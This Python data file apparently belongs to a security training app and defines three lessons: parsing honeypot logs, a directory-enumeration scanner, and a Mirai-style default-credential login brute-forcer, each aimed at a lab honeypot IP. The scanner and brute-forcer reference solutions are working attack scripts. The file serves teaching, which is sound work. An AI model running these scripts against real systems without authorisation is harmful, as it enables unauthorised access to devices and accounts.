# ============================================================================
# scripting/lessons.py — Code & Catch Lesson Data
# ============================================================================
# Each lesson contains:
#   - Scenario briefing and learning objectives
#   - Starter code template
#   - Structural validation rules (required constructs)
#   - Progressive hints
#   - Reference solution with line-by-line explanation
# ============================================================================

LESSONS = {

    # ==================================================================
    # LESSON 1: The Log Hunter (Defensive Bash Scripting)
    # ==================================================================
    'log_hunter': {
        'id': 'log_hunter',
        'title': 'The Log Hunter',
        'subtitle': 'Defensive Bash Scripting',
        'difficulty': 'Beginner',
        'difficulty_color': 'green',
        'icon': '🔍',
        'language': 'bash',
        'badge': 'Blue Team',
        'badge_color': 'blue',
        'summary': 'Your honeypot captured 24 hours of HTTP traffic. The SOC team needs a quick threat report but the dashboard is down. Extract the attacking IP addresses from raw Nginx logs using only the Linux command line.',
        'learning_objectives': [
            'Parse structured log files with grep and awk',
            'Chain Linux commands with pipes for data extraction',
            'Filter HTTP status codes to isolate suspicious traffic'
        ],
        'challenge': 'Write a Bash one-liner that extracts only the IP addresses from log entries that returned a <strong>404 Not Found</strong> status code. Your output should be a sorted, deduplicated list of IPs.',

        'sample_log': '''192.168.1.50 - - [15/Mar/2026:02:14:01 +0000] "GET /favicon.ico HTTP/1.1" 200 1406
66.249.68.100 - - [15/Mar/2026:02:14:05 +0000] "GET /robots.txt HTTP/1.1" 200 154
185.220.101.1 - - [15/Mar/2026:02:14:08 +0000] "POST /login HTTP/1.1" 401 187
45.155.205.233 - - [15/Mar/2026:02:15:14 +0000] "GET /wp-admin HTTP/1.1" 404 0
218.92.0.107 - - [15/Mar/2026:02:15:16 +0000] "GET /admin HTTP/1.1" 404 0
192.168.1.50 - - [15/Mar/2026:02:20:30 +0000] "GET / HTTP/1.1" 200 4821
103.152.118.120 - - [15/Mar/2026:02:21:01 +0000] "GET /config.bin HTTP/1.1" 404 0
40.77.167.6 - - [15/Mar/2026:02:25:00 +0000] "GET / HTTP/1.1" 200 4821
45.155.205.233 - - [15/Mar/2026:02:25:05 +0000] "GET /.env HTTP/1.1" 404 0
54.236.1.11 - - [15/Mar/2026:02:30:00 +0000] "GET /health HTTP/1.1" 200 2''',

        'starter_code': '# Extract IPs that triggered 404 errors from the access log\n# Hint: Use grep to filter, awk to extract, sort + uniq to deduplicate\n\ncat access.log | ',

        'validations': [
            {'keyword': 'grep', 'label': 'grep (filter lines)', 'description': 'Use grep to filter lines containing 404'},
            {'keyword': '404', 'label': '404 (status code)', 'description': 'The HTTP status code to search for'},
            {'keyword': 'awk', 'label': 'awk (extract fields)', 'description': 'Use awk to extract the IP address column ($1)'},
            {'keyword': 'sort', 'label': 'sort (order results)', 'description': 'Sort the output alphabetically'},
            {'keyword': 'uniq', 'label': 'uniq (deduplicate)', 'description': 'Remove duplicate IP addresses'},
        ],

        'hints': [
            'Start with <code>grep "404"</code> to filter only the lines with 404 status codes.',
            'Pipe the output to <code>awk \'{print $1}\'</code> — in Nginx logs, the IP address is always the first field ($1).',
            'Chain <code>sort | uniq</code> at the end to remove duplicate IPs and get a clean list.',
            'The full pattern is: <code>cat access.log | grep "..." | awk \'...\' | sort | uniq</code>',
        ],

        'reference_code': "cat access.log | grep '404' | awk '{print $1}' | sort | uniq",

        'reference_explanation': [
            {'line': "cat access.log", 'explanation': 'Read the raw Nginx access log file and send its contents to stdout.'},
            {'line': "grep '404'", 'explanation': 'Filter: keep only lines containing "404" (HTTP Not Found status). This isolates directory probes and failed path scans.'},
            {'line': "awk '{print $1}'", 'explanation': 'Extract: print only the first whitespace-delimited field from each line. In Nginx combined log format, $1 is always the client IP address.'},
            {'line': "sort", 'explanation': 'Sort the IP addresses alphabetically. Required before uniq, which only removes adjacent duplicates.'},
            {'line': "uniq", 'explanation': 'Remove duplicate IPs, producing a clean list of unique attackers who triggered 404 errors.'},
        ]
    },

    # ==================================================================
    # LESSON 2: The Custom Scanner (Offensive Python)
    # ==================================================================
    'custom_scanner': {
        'id': 'custom_scanner',
        'title': 'The Custom Scanner',
        'subtitle': 'Offensive Python — Directory Enumeration',
        'difficulty': 'Intermediate',
        'difficulty_color': 'yellow',
        'icon': '📡',
        'language': 'python',
        'badge': 'Red Team',
        'badge_color': 'red',
        'summary': 'Tools like Gobuster and ffuf automate directory brute-forcing — but how do they actually work under the hood? In this lesson, you will write a Python directory scanner from scratch using the requests library.',
        'learning_objectives': [
            'Understand how directory enumeration tools construct HTTP requests',
            'Use Python requests library to send GET requests programmatically',
            'Parse HTTP response status codes to identify valid endpoints'
        ],
        'challenge': 'Write a Python script that iterates over a wordlist of paths, sends a GET request to each, and prints the URL if the server responds with status code <strong>200 OK</strong>. Target: <code>http://192.168.10.128</code>',

        'sample_log': None,

        'starter_code': '''import requests

target = "http://192.168.10.128"
wordlist = ["backup", "config", "admin", "test", "api"]

# Loop through each word and check if the path exists
''',

        'validations': [
            {'keyword': 'import requests', 'label': 'import requests', 'description': 'Import the HTTP library'},
            {'keyword': 'for', 'label': 'for loop', 'description': 'Iterate over the wordlist'},
            {'keyword': 'requests.get', 'label': 'requests.get()', 'description': 'Send HTTP GET request to each path'},
            {'keyword': 'status_code', 'label': '.status_code', 'description': 'Check the HTTP response status code'},
            {'keyword': '200', 'label': '200 (OK)', 'description': 'Filter for successful responses'},
        ],

        'hints': [
            'Use a <code>for</code> loop: <code>for word in wordlist:</code> to iterate over each path.',
            'Build the URL inside the loop: <code>url = f"{target}/{word}"</code>',
            'Send the request: <code>response = requests.get(url)</code>',
            'Check the result: <code>if response.status_code == 200: print(f"Found: {url}")</code>',
        ],

        'reference_code': '''import requests

target = "http://192.168.10.128"
wordlist = ["backup", "config", "admin", "test", "api"]

for word in wordlist:
    url = f"{target}/{word}"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"[+] Found: {url}")
    else:
        print(f"[-] {url} -> {response.status_code}")''',

        'reference_explanation': [
            {'line': 'import requests', 'explanation': 'Import Python\'s most popular HTTP library. This is what tools like Gobuster use internally to send web requests.'},
            {'line': 'target = "http://192.168.10.128"', 'explanation': 'Define the base URL of the target. In a real scan, this would be the IP of the device you\'re testing.'},
            {'line': 'wordlist = ["backup", "config", ...]', 'explanation': 'A small wordlist of common directory names. Real tools like Gobuster use lists with 200K+ entries from SecLists.'},
            {'line': 'for word in wordlist:', 'explanation': 'Loop through each word — this is the core of how directory brute-forcing works: try every possible path.'},
            {'line': 'url = f"{target}/{word}"', 'explanation': 'Construct the full URL by appending each word as a path. f-strings make this clean and readable.'},
            {'line': 'response = requests.get(url)', 'explanation': 'Send an HTTP GET request — identical to what your browser does when you visit a URL, or what curl sends.'},
            {'line': 'if response.status_code == 200:', 'explanation': 'Check if the server responded with 200 (OK), meaning the path exists. 404 means not found, 403 means forbidden.'},
            {'line': 'print(f"[+] Found: {url}")', 'explanation': 'Print discovered paths with [+] prefix — a common convention in security tools for positive results.'},
        ]
    },

    # ==================================================================
    # LESSON 3: The Mini-Botnet Payload (Offensive Python)
    # ==================================================================
    'mini_botnet': {
        'id': 'mini_botnet',
        'title': 'The Mini-Botnet Payload',
        'subtitle': 'Offensive Python — Credential Automation',
        'difficulty': 'Advanced',
        'difficulty_color': 'red',
        'icon': '🤖',
        'language': 'python',
        'badge': 'Red Team',
        'badge_color': 'red',
        'summary': 'The Mirai botnet infected over 600,000 IoT devices by trying just 62 default credentials. In this lesson, you will write a Python script that replicates this brute-force technique — safely targeting your own honeypot.',
        'learning_objectives': [
            'Understand how IoT botnets automate credential stuffing',
            'Send HTTP POST requests with form data using Python',
            'Parse HTTP responses to detect successful vs failed logins'
        ],
        'challenge': 'Write a Python script that reads a list of default IoT credentials, sends HTTP POST requests to <code>/login</code>, and reports which credential pair triggers a different response (indicating potential success). Target: <code>http://192.168.10.128</code>',

        'sample_log': None,

        'starter_code': '''import requests

target = "http://192.168.10.128/login"
credentials = [
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", "admin123"),
]

# Loop through credentials and attempt login
''',

        'validations': [
            {'keyword': 'import requests', 'label': 'import requests', 'description': 'Import the HTTP library'},
            {'keyword': 'for', 'label': 'for loop', 'description': 'Iterate over the credential pairs'},
            {'keyword': 'requests.post', 'label': 'requests.post()', 'description': 'Send HTTP POST request (not GET) to submit login form'},
            {'keyword': 'username', 'label': 'username field', 'description': 'Include username in the POST data'},
            {'keyword': 'password', 'label': 'password field', 'description': 'Include password in the POST data'},
        ],

        'hints': [
            'Use tuple unpacking in the loop: <code>for username, password in credentials:</code>',
            'Send form data with POST: <code>requests.post(target, data={"username": username, "password": password})</code>',
            'The honeypot returns a redirect (status 302) for all attempts. Check <code>response.status_code</code> or <code>response.text</code> for differences.',
            'Add <code>allow_redirects=False</code> to requests.post() to see the raw redirect status instead of following it.',
        ],

        'reference_code': '''import requests

target = "http://192.168.10.128/login"
credentials = [
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", "admin123"),
]

for username, password in credentials:
    response = requests.post(
        target,
        data={"username": username, "password": password},
        allow_redirects=False
    )
    if response.status_code != 302:
        print(f"+ {username}:{password} -> HTTP {response.status_code}")
    else:
        print(f"- {username}:{password} -> HTTP {response.status_code}")''',

        'reference_explanation': [
            {'line': 'import requests', 'explanation': 'Import the HTTP library — the same one Mozi and other Python-based botnets use for web exploitation.'},
            {'line': 'target = "http://192.168.10.128/login"', 'explanation': 'The login endpoint. IoT devices commonly expose /login, /auth, or /cgi-bin/login as POST targets.'},
            {'line': 'credentials = [("admin", "admin"), ...]', 'explanation': 'A list of tuples — each is a (username, password) pair. Mirai\'s source code contained 62 such pairs targeting routers, cameras, and DVRs.'},
            {'line': 'for username, password in credentials:', 'explanation': 'Tuple unpacking — Python splits each (user, pass) pair into two variables automatically. This is the automation loop that makes botnets so efficient.'},
            {'line': 'response = requests.post(target, data={...})', 'explanation': 'Send an HTTP POST with form data — identical to what happens when you submit a login form in a browser. The data dict maps to form field names.'},
            {'line': 'allow_redirects=False', 'explanation': 'Critical for brute-forcing: prevents Python from automatically following redirects. This lets you see the raw HTTP status (302 redirect vs 200 success) to distinguish failed from successful logins.'},
            {'line': 'print(f"[{...}] {username}:{password} -> HTTP {status}")', 'explanation': 'Report each attempt with [+] for potential success and [-] for failure. Real botnet code would trigger a payload download on [+] instead of printing.'},
        ]
    },
}


def get_lesson(lesson_id):
    return LESSONS.get(lesson_id)


def get_all_lessons():
    return [
        {
            'id': l['id'],
            'title': l['title'],
            'subtitle': l['subtitle'],
            'difficulty': l['difficulty'],
            'difficulty_color': l['difficulty_color'],
            'icon': l['icon'],
            'language': l['language'],
            'badge': l['badge'],
            'badge_color': l['badge_color'],
            'summary': l['summary'],
        }
        for l in LESSONS.values()
    ]